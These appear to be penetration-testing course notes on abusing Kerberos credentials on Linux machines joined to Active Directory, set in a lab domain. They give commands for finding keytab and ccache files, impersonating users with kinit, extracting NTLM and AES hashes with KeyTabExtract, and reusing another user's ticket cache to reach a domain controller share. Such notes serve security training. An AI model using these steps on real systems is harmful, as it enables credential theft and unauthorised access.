# Content 
- [Identifying Linux and Active Directory Integration](#identifying-linux-and-active-directory-integration)
  - [realm - Check If Linux Machine is Domain Joined](#realm---check-if-linux-machine-is-domain-joined)
  - [command line - Check if Linux Machine is Domain Joined](#command-line---check-if-linux-machine-is-domain-joined) 
- [Finding Kerberos Tickets in Linux](#finding-kerberos-tickets-in-linux)
  - [Finding Keytab Files](#finding-keytab-files)
  - [Finding ccache Files](#finding-ccache-files)
- [Abusing KeyTab Files](#abusing-keytab-files)
- [Abusing Keytab ccache](#abusing-keytab-ccache)


## Identifying Linux and Active Directory Integration

### realm - Check If Linux Machine is Domain Joined
```
realm list
```

### command line - Check if Linux Machine is Domain Joined
we can also look for other tools used to integrate Linux with Active Directory such as `sssd` or `winbind`. 

#### check whether the Linux server is integrated with AD using PS Command
```powershell
# You might get the output similar to below if the system is integrated with AD using SSSD service.
$ ps -ef | grep -i "winbind\|sssd"
root     29912     1  0  2017 ?        00:19:09 /usr/sbin/sssd -f -D
root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files

# You might get the output similar to below if the system is integrated with AD using winbind service.
$ ps -ef | grep -i "winbind\|sssd"
root       676 21055  0  2017 ?        00:00:22 winbindd
```
#### Check whether the Linux server is integrated with AD using id Command
```powershell
$ id daygeek
uid=1918901106(daygeek) gid=1918900513(domain users) groups=1918900513(domain users)
```
#### check whether the Linux server is integrated with AD using nsswitch.conf file
```powershell
## You might get the output similar to below if the system is integrated with AD using SSSD service.
$ cat /etc/nsswitch.conf | grep -i "sss\|winbind\|ldap"

passwd:         files sss
shadow:         files sss

# You might get the output similar to below if the system is integrated with AD using winbind service.
$ cat /etc/nsswitch.conf | grep -i "sss\|winbind\|ldap"

passwd:     files [SUCCESS=return] winbind

# You might get the output similer to below if the system is integrated with AD using ldap service.
$ cat /etc/nsswitch.conf | grep -i "sss\|winbind\|ldap"

passwd:         files ldap
shadow:         files ldap
```

#### check whether the Linux server is integrated with AD using system-auth file

```powershell
# You might get the output similar to below if the system is integrated with AD using SSSD service.
$ cat /etc/pam.d/system-auth  | grep -i "pam_sss.so\|pam_winbind.so\|pam_ldap.so"
# or
$ cat /etc/pam.d/system-auth-ac  | grep -i "pam_sss.so\|pam_winbind.so\|pam_ldap.so"
auth        sufficient    pam_sss.so use_first_pass

# You might get the output similar to below if the system is integrated with AD using winbind service.
$ cat /etc/pam.d/system-auth  | grep -i "pam_sss.so\|pam_winbind.so\|pam_ldap.so"
# or
$ cat /etc/pam.d/system-auth-ac  | grep -i "pam_sss.so\|pam_winbind.so\|pam_ldap.so"
auth        sufficient    pam_winbind.so cached_login use_first_pass

# You might get the output similar to below if the system is integrated with AD using ldap service.
$ cat /etc/pam.d/system-auth  | grep -i "pam_sss.so\|pam_winbind.so\|pam_ldap.so"
# or
$ cat /etc/pam.d/system-auth-ac  | grep -i "pam_sss.so\|pam_winbind.so\|pam_ldap.so"
auth        sufficient    pam_ldap.so cached_login use_first_pass

```


## Finding Kerberos Tickets in Linux

### Finding Keytab Files
- A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password).
- You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password.
- Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.
 
#### Using Find to Search for Files with Keytab in the Name
- The ticket is represented as a keytab file located by default at /etc/krb5.keytab and can only be read by the root user.
```powershell
$ find / -name *keytab* -ls 2>/dev/null

   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```
#### Identifying Keytab Files in Cronjobs
- we notice the use of kinit, which means that Kerberos is in use. kinit allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). 
- We can use kinit to import a keytab into our session and act as the user.

```powershell
$ crontab -l

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```


### Finding ccache Files
- Linux machines store Kerberos tickets as ccache files in the `/tmp` directory.
- By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`.
- `KRB5CCNAME` variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed.
- These ccache files are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets

#### Reviewing Environment Variables for ccache Files.
```powershell
$ env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

#### Searching for ccache Files in /tmp
```
$ ls -la /tmp

-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
-rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
```

## Abusing KeyTab Files
- The first thing we can do is impersonate a user using `kinit`.
- To use a keytab file, we need to know which user it was created for using `klist`
### Listing keytab File Information
```powershell
$ klist -k -t 

/opt/specialfiles/carlos.keytab 
Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

### Impersonating a User with a keytab
Note: To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable KRB5CCNAME.
```powershell
$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
$ smbclient //dc01/carlos -k -c ls
```

### Keytab Extract
We can attempt to crack the account's password by extracting the hashes from the keytab file using [KeyTabExtract](https://github.com/sosdave/KeyTabExtract). 
```powershell
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```
- With the NTLM hash, we can perform a Pass the Hash attack. 
- With the AES256 or AES128 hash, we can forge our tickets using Rubeus PtT.
- or attempt to crack the hashes to obtain the plaintext password.


## Abusing Keytab ccache
- klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work.
- ccache files are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
```powershell
ls -la /tmp
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
smbclient //dc01/C$ -k -c ls -no-pass
```
